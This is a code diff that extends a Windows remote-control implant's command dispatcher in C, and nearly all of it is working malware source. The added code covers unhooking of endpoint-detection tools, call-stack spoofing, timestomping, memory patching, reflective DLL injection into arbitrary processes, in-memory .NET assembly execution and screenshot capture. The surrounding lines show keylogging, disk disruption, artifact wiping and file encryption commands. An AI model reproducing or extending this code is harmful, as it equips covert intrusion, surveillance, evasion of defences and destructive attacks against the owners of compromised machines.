@@ -7,6 +7,10 @@
 #include <windows.h>
 #include <stdio.h>
 #include <psapi.h>
+#include <mscoree.h>
+#include <metahost.h>
+
+#pragma comment(lib, "mscoree.lib")
 
 // Direct syscall wrappers (from direct_syscall.c)
 extern NTSTATUS Syscall_NtAllocateVirtualMemory(HANDLE hProcess, PVOID* pBase, ULONG_PTR ZeroBits, PSIZE_T pSize, ULONG AllocType, ULONG Protect);
@@ -20,6 +24,24 @@ extern BOOL BofExecute(const BYTE *coff_data, SIZE_T coff_size,
 
 // External process hollowing implementation
 extern BOOL ProcessHollowing(LPCSTR szTargetPath, LPVOID pPayload, DWORD dwPayloadSize);
+
+// Evasion modules (from implant.h / fitnah/implant/)
+extern BOOL HwBpBypassInit(void);
+extern BOOL SpoofInit(void);
+
+// Timestomp (from evasion/anti_analysis.c)
+extern BOOL Timestomp(LPCSTR szSourcePath, LPCSTR szTargetPath);
+
+// Stephen Fewer canonical RDI (injection/LoadLibraryR.c — BSD-3)
+extern HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength,
+                                   LPCSTR cpReflectiveLoaderName);
+extern HANDLE  WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer,
+                                         DWORD dwLength,
+                                         LPCSTR cpReflectiveLoaderName,
+                                         LPVOID lpParameter);
+
+// RefreshPE — unhook all EDR hooks across all loaded DLLs (evasion/pe_refresh.c)
+extern VOID RefreshPE(void);
 
 /* ── forward declarations for static keylogger state ────────────────────── */
 static HHOOK  s_kbhook    = NULL;
@@ -77,6 +99,16 @@ char *cmd_dispatch(const Task *t) {
     if (strcmp(t->command, "wipe_artifacts") == 0) {
         return cmd_wipe_artifacts();
     }
+    if (strcmp(t->command, "refresh_modules") == 0) {
+        RefreshPE();
+        return str_dup("refresh_modules: all hooked DLLs restored from disk");
+    }
+    if (strcmp(t->command, "dll_inject") == 0) {
+        char *dll_b64 = json_get_str(t->args_json, "dll_b64");
+        char *r       = cmd_dll_inject(dll_b64 ? dll_b64 : "");
+        free(dll_b64);
+        return r;
+    }
     if (strcmp(t->command, "disk_disrupt") == 0) {
         return cmd_disk_disrupt();
     }
@@ -92,6 +124,42 @@ char *cmd_dispatch(const Task *t) {
     }
     if (strcmp(t->command, "die") == 0) {
         ExitProcess(0);
+    }
+    if (strcmp(t->command, "hwbp_init") == 0) {
+        return HwBpBypassInit() ? str_dup("hwbp: active") : str_dup("hwbp: failed");
+    }
+    if (strcmp(t->command, "spoof_init") == 0) {
+        return SpoofInit() ? str_dup("spoof: active") : str_dup("spoof: no gadget found");
+    }
+    if (strcmp(t->command, "timestomp") == 0) {
+        char *src = json_get_str(t->args_json, "source");
+        char *dst = json_get_str(t->args_json, "target");
+        char *r   = cmd_timestomp(src ? src : "", dst ? dst : "");
+        free(src); free(dst);
+        return r;
+    }
+    if (strcmp(t->command, "mem_patch") == 0) {
+        char *addr_s = json_get_str(t->args_json, "address");
+        char *patch  = json_get_str(t->args_json, "patch_b64");
+        char *r      = cmd_mem_patch(addr_s ? addr_s : "0", patch ? patch : "");
+        free(addr_s); free(patch);
+        return r;
+    }
+    if (strcmp(t->command, "rdi_inject") == 0) {
+        char *pid_s  = json_get_str(t->args_json, "pid");
+        char *dll_b64 = json_get_str(t->args_json, "dll_b64");
+        char *r      = cmd_rdi_inject(pid_s ? (DWORD)atoi(pid_s) : 0,
+                                      dll_b64 ? dll_b64 : "");
+        free(pid_s); free(dll_b64);
+        return r;
+    }
+    if (strcmp(t->command, "execute_assembly") == 0) {
+        char *asm_b64 = json_get_str(t->args_json, "assembly_b64");
+        char *args    = json_get_str(t->args_json, "args");
+        char *r       = cmd_execute_assembly(asm_b64 ? asm_b64 : "",
+                                             args    ? args    : "");
+        free(asm_b64); free(args);
+        return r;
     }
 
     /* ── In-process BOF execution ──────────────────────────────────────────
@@ -210,12 +278,56 @@ char* cmd_ps(const char *script) {
     return cmd_exec(cmd);
 }
 
-/* 
- * cmd_screenshot: Capture screenshot via GDI (standard implementation)
+/*
+ * cmd_screenshot: Capture screenshot via GDI BitBlt → 24-bit BMP → base64
  */
-char* cmd_screenshot(void) {
-    // Screenshot logic (omitted for brevity, assume implementation exists)
-    return strdup("Screenshot captured");
+char *cmd_screenshot(void) {
+    HDC     hScreen  = GetDC(NULL);
+    HDC     hMemDC   = CreateCompatibleDC(hScreen);
+    int     width    = GetSystemMetrics(SM_CXSCREEN);
+    int     height   = GetSystemMetrics(SM_CYSCREEN);
+    HBITMAP hBmp     = CreateCompatibleBitmap(hScreen, width, height);
+    SelectObject(hMemDC, hBmp);
+    BitBlt(hMemDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY | CAPTUREBLT);
+
+    /* Build DIB header */
+    BITMAPINFOHEADER bih = {0};
+    bih.biSize        = sizeof(bih);
+    bih.biWidth       = width;
+    bih.biHeight      = -height; /* top-down */
+    bih.biPlanes      = 1;
+    bih.biBitCount    = 24;
+    bih.biCompression = BI_RGB;
+    DWORD stride = ((width * 3 + 3) & ~3);
+    DWORD pixSz  = stride * height;
+
+    uint8_t *pixels = malloc(pixSz);
+    GetDIBits(hMemDC, hBmp, 0, height, pixels,
+              (BITMAPINFO *)&bih, DIB_RGB_COLORS);
+
+    /* Build BMP file in memory: BITMAPFILEHEADER + BITMAPINFOHEADER + pixels */
+    DWORD fileHdrSz = 14;
+    DWORD totalSz   = fileHdrSz + sizeof(bih) + pixSz;
+    uint8_t *bmp    = malloc(totalSz);
+
+    /* BITMAPFILEHEADER */
+    bmp[0] = 'B'; bmp[1] = 'M';
+    *(DWORD *)(bmp + 2)  = totalSz;
+    *(WORD  *)(bmp + 6)  = 0;
+    *(WORD  *)(bmp + 8)  = 0;
+    *(DWORD *)(bmp + 10) = fileHdrSz + sizeof(bih);
+
+    memcpy(bmp + fileHdrSz, &bih, sizeof(bih));
+    memcpy(bmp + fileHdrSz + sizeof(bih), pixels, pixSz);
+
+    free(pixels);
+    DeleteObject(hBmp);
+    DeleteDC(hMemDC);
+    ReleaseDC(NULL, hScreen);
+
+    char *b64 = b64_encode(bmp, totalSz);
+    free(bmp);
+    return b64 ? b64 : str_dup("error: screenshot encode failed");
 }
 
 /* ── cmd_download ────────────────────────────────────────────────────────── */
@@ -453,4 +565,278 @@ char *cmd_encrypt_files(const char *root, const char *ext, const char *key_hex) 
              "encrypted %d file(s) under %s | key: %s", count, root, key_out);
     secure_zero(key, sizeof(key));
     return str_dup(result);
+}
+
+/* ── cmd_timestomp ───────────────────────────────────────────────────────── */
+char *cmd_timestomp(const char *source, const char *target) {
+    if (!source || !*source || !target || !*target)
+        return str_dup("error: timestomp requires source and target paths");
+    return Timestomp(source, target) ? str_dup("timestomp: ok") : str_dup("error: timestomp failed");
+}
+
+/* ── cmd_mem_patch ───────────────────────────────────────────────────────── */
+char *cmd_mem_patch(const char *addr_hex, const char *patch_b64) {
+    if (!addr_hex || !patch_b64) return str_dup("error: missing address or patch");
+
+    PVOID addr = (PVOID)(uintptr_t)strtoull(addr_hex, NULL, 16);
+    if (!addr) return str_dup("error: invalid address");
+
+    size_t  patch_len = 0;
+    uint8_t *patch    = (uint8_t *)b64_decode(patch_b64, &patch_len);
+    if (!patch) return str_dup("error: patch base64 decode failed");
+
+    /* Remove page protection, write bytes, restore */
+    ULONG old_protect = 0;
+    SIZE_T region_sz  = patch_len;
+    PVOID  region_ptr = addr;
+
+    NTSTATUS st = ISysNtProtectVirtualMemory(
+        GetCurrentProcess(), &region_ptr, &region_sz,
+        PAGE_EXECUTE_READWRITE, &old_protect);
+    if (!NT_SUCCESS(st)) {
+        free(patch);
+        char r[64];
+        snprintf(r, sizeof(r), "error: protect failed 0x%08X", (unsigned)st);
+        return str_dup(r);
+    }
+
+    SIZE_T written = 0;
+    ISysNtWriteVirtualMemory(GetCurrentProcess(), addr, patch, (SIZE_T)patch_len, &written);
+
+    /* Restore original protection */
+    ISysNtProtectVirtualMemory(
+        GetCurrentProcess(), &region_ptr, &region_sz, old_protect, &old_protect);
+
+    free(patch);
+    char r[64];
+    snprintf(r, sizeof(r), "patched %zu bytes at %s", written, addr_hex);
+    return str_dup(r);
+}
+
+/* ── cmd_rdi_inject ──────────────────────────────────────────────────────── */
+/*
+ * Remote reflective DLL injection into an arbitrary process using Stephen
+ * Fewer's canonical LoadRemoteLibraryR (LoadLibraryR.c, BSD-3).
+ * The DLL must export "ReflectiveLoader" (compiled with ReflectiveLoader.c).
+ */
+char *cmd_rdi_inject(DWORD pid, const char *dll_b64) {
+    if (!pid)    return str_dup("error: rdi_inject requires pid");
+    if (!dll_b64 || !*dll_b64) return str_dup("error: rdi_inject requires dll_b64");
+
+    size_t   dll_len  = 0;
+    uint8_t *dll_data = (uint8_t *)b64_decode(dll_b64, &dll_len);
+    if (!dll_data) return str_dup("error: dll base64 decode failed");
+
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) {
+        free(dll_data);
+        return str_dup("error: OpenProcess failed");
+    }
+
+    /* LoadRemoteLibraryR allocates memory in the target, writes the DLL,
+     * finds ReflectiveLoader export, and creates a remote thread on it.    */
+    HANDLE hThread = LoadRemoteLibraryR(hProc, dll_data, (DWORD)dll_len,
+                                        "ReflectiveLoader", NULL);
+    CloseHandle(hProc);
+    free(dll_data);
+
+    if (!hThread) {
+        char r[96];
+        snprintf(r, sizeof(r), "rdi_inject: failed (pid %lu, gle %lu)",
+                 (unsigned long)pid, (unsigned long)GetLastError());
+        return str_dup(r);
+    }
+
+    /* Wait up to 10 s for the loader thread to finish */
+    WaitForSingleObject(hThread, 10000);
+    CloseHandle(hThread);
+
+    char r[64];
+    snprintf(r, sizeof(r), "rdi_inject: ok (pid %lu)", (unsigned long)pid);
+    return str_dup(r);
+}
+
+/* ── cmd_dll_inject ──────────────────────────────────────────────────────── */
+/*
+ * Load a reflective DLL into the CURRENT process using LoadLibraryR.
+ * Useful for loading capability modules in-process without touching disk.
+ */
+char *cmd_dll_inject(const char *dll_b64) {
+    if (!dll_b64 || !*dll_b64) return str_dup("error: dll_inject requires dll_b64");
+
+    size_t   dll_len  = 0;
+    uint8_t *dll_data = (uint8_t *)b64_decode(dll_b64, &dll_len);
+    if (!dll_data) return str_dup("error: dll base64 decode failed");
+
+    HMODULE hMod = LoadLibraryR(dll_data, (DWORD)dll_len, "ReflectiveLoader");
+    free(dll_data);
+
+    if (!hMod) {
+        char r[64];
+        snprintf(r, sizeof(r), "dll_inject: failed (gle %lu)", (unsigned long)GetLastError());
+        return str_dup(r);
+    }
+
+    char r[64];
+    snprintf(r, sizeof(r), "dll_inject: ok (base 0x%p)", (void *)hMod);
+    return str_dup(r);
+}
+
+/* ── cmd_execute_assembly ────────────────────────────────────────────────── */
+/*
+ * Load a .NET assembly into the current process via ICLRRuntimeHost2
+ * (mscoree.dll). The assembly is passed as a base64-encoded blob.
+ * Arguments are passed as a single space-delimited string and split into
+ * an argv-style SAFEARRAY by the CLR host.
+ *
+ * References: Havoc execute-assembly, Cobalt Strike execute-assembly
+ * MITRE: T1055 / T1059.001
+ */
+char *cmd_execute_assembly(const char *asm_b64, const char *arguments) {
+    if (!asm_b64 || !*asm_b64)
+        return str_dup("error: execute_assembly requires assembly_b64");
+
+    size_t   asm_len  = 0;
+    uint8_t *asm_data = (uint8_t *)b64_decode(asm_b64, &asm_len);
+    if (!asm_data) return str_dup("error: assembly base64 decode failed");
+
+    /* ── 1. Resolve ICLRMetaHost via mscoree.dll ──────────────────────────── */
+    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
+    if (!hMscoree) {
+        free(asm_data);
+        return str_dup("error: mscoree.dll not found");
+    }
+    typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
+    pfnCLRCreateInstance fnCLRCreateInstance =
+        (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
+    if (!fnCLRCreateInstance) {
+        FreeLibrary(hMscoree);
+        free(asm_data);
+        return str_dup("error: CLRCreateInstance not found");
+    }
+
+    ICLRMetaHost *pMetaHost = NULL;
+    HRESULT hr = fnCLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost,
+                                     (LPVOID*)&pMetaHost);
+    if (FAILED(hr)) {
+        FreeLibrary(hMscoree);
+        free(asm_data);
+        char r[64];
+        snprintf(r, sizeof(r), "error: CLRCreateInstance 0x%08X", (unsigned)hr);
+        return str_dup(r);
+    }
+
+    /* ── 2. Get latest installed runtime ─────────────────────────────────── */
+    IEnumUnknown *pEnum = NULL;
+    pMetaHost->lpVtbl->EnumerateInstalledRuntimes(pMetaHost, &pEnum);
+
+    ICLRRuntimeInfo *pRuntime = NULL;
+    IUnknown *pItem = NULL;
+    ULONG fetched   = 0;
+    /* Walk runtimes, pick the last (highest) version */
+    while (pEnum->lpVtbl->Next(pEnum, 1, &pItem, &fetched) == S_OK) {
+        if (pRuntime) pRuntime->lpVtbl->Release(pRuntime);
+        pRuntime = (ICLRRuntimeInfo *)pItem;
+    }
+    pEnum->lpVtbl->Release(pEnum);
+
+    if (!pRuntime) {
+        pMetaHost->lpVtbl->Release(pMetaHost);
+        FreeLibrary(hMscoree);
+        free(asm_data);
+        return str_dup("error: no CLR runtime installed");
+    }
+
+    /* ── 3. Get ICorRuntimeHost and start it ─────────────────────────────── */
+    ICorRuntimeHost *pRtHost = NULL;
+    hr = pRuntime->lpVtbl->GetInterface(pRuntime, &CLSID_CorRuntimeHost,
+                                        &IID_ICorRuntimeHost, (LPVOID*)&pRtHost);
+    pRuntime->lpVtbl->Release(pRuntime);
+    pMetaHost->lpVtbl->Release(pMetaHost);
+    FreeLibrary(hMscoree);
+
+    if (FAILED(hr)) {
+        free(asm_data);
+        char r[64];
+        snprintf(r, sizeof(r), "error: GetInterface ICorRuntimeHost 0x%08X", (unsigned)hr);
+        return str_dup(r);
+    }
+    pRtHost->lpVtbl->Start(pRtHost);
+
+    /* ── 4. Get default AppDomain ─────────────────────────────────────────── */
+    IUnknown *pDomUnk = NULL;
+    pRtHost->lpVtbl->GetDefaultDomain(pRtHost, &pDomUnk);
+
+    _AppDomain *pDomain = NULL;
+    pDomUnk->lpVtbl->QueryInterface(pDomUnk, &IID__AppDomain, (LPVOID*)&pDomain);
+    pDomUnk->lpVtbl->Release(pDomUnk);
+
+    if (!pDomain) {
+        pRtHost->lpVtbl->Release(pRtHost);
+        free(asm_data);
+        return str_dup("error: QueryInterface _AppDomain failed");
+    }
+
+    /* ── 5. Load assembly from byte array ────────────────────────────────── */
+    SAFEARRAY *pSA = SafeArrayCreateVector(VT_UI1, 0, (ULONG)asm_len);
+    void *pData    = NULL;
+    SafeArrayAccessData(pSA, &pData);
+    memcpy(pData, asm_data, asm_len);
+    SafeArrayUnaccessData(pSA);
+    free(asm_data);
+
+    _Assembly *pAssembly = NULL;
+    hr = pDomain->lpVtbl->Load_3(pDomain, pSA, &pAssembly);
+    SafeArrayDestroy(pSA);
+    pDomain->lpVtbl->Release(pDomain);
+
+    if (FAILED(hr)) {
+        pRtHost->lpVtbl->Release(pRtHost);
+        char r[64];
+        snprintf(r, sizeof(r), "error: Load_3 0x%08X", (unsigned)hr);
+        return str_dup(r);
+    }
+
+    /* ── 6. Get entry point and invoke ───────────────────────────────────── */
+    _MethodInfo *pEntry = NULL;
+    pAssembly->lpVtbl->get_EntryPoint(pAssembly, &pEntry);
+
+    if (!pEntry) {
+        pAssembly->lpVtbl->Release(pAssembly);
+        pRtHost->lpVtbl->Release(pRtHost);
+        return str_dup("error: assembly has no entry point");
+    }
+
+    /* Build SAFEARRAY of args (one BSTR element per space-delimited token) */
+    SAFEARRAY *pArgsSA = SafeArrayCreateVector(VT_BSTR, 0, arguments && *arguments ? 1 : 0);
+    if (arguments && *arguments) {
+        LONG idx    = 0;
+        int  wlen   = MultiByteToWideChar(CP_UTF8, 0, arguments, -1, NULL, 0);
+        WCHAR *warg = (WCHAR *)malloc(wlen * sizeof(WCHAR));
+        MultiByteToWideChar(CP_UTF8, 0, arguments, -1, warg, wlen);
+        BSTR barg   = SysAllocString(warg);
+        free(warg);
+        SafeArrayPutElement(pArgsSA, &idx, barg);
+        SysFreeString(barg);
+    }
+
+    VARIANT vtEmpty  = {0};
+    VARIANT vtArgs   = {0};
+    vtArgs.vt        = VT_ARRAY | VT_BSTR;
+    vtArgs.parray    = pArgsSA;
+    VARIANT vtResult = {0};
+
+    hr = pEntry->lpVtbl->Invoke_3(pEntry, vtEmpty, &vtArgs, &vtResult);
+    SafeArrayDestroy(pArgsSA);
+    pEntry->lpVtbl->Release(pEntry);
+    pAssembly->lpVtbl->Release(pAssembly);
+    pRtHost->lpVtbl->Release(pRtHost);
+
+    if (FAILED(hr)) {
+        char r[64];
+        snprintf(r, sizeof(r), "error: Invoke_3 0x%08X", (unsigned)hr);
+        return str_dup(r);
+    }
+
+    return str_dup("execute_assembly: ok");
 }
